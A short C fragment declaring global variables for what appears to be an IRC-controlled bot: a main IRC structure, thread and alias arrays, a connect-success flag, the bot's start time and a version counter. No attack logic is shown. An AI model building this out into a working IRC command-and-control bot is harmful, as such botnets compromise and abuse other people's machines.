// main irc structure
ircs mainirc;

// threads structure
thread threads[MAXTHREADS]; 

// aliases structure
as aliases[MAXALIASES];
int anum = MAXALIASES;

// misc.
BOOL success = FALSE;   // if true then we made successful connect attempt
DWORD started;          // time bot was started
int current_version=0;  // current bot version (from versionlist)
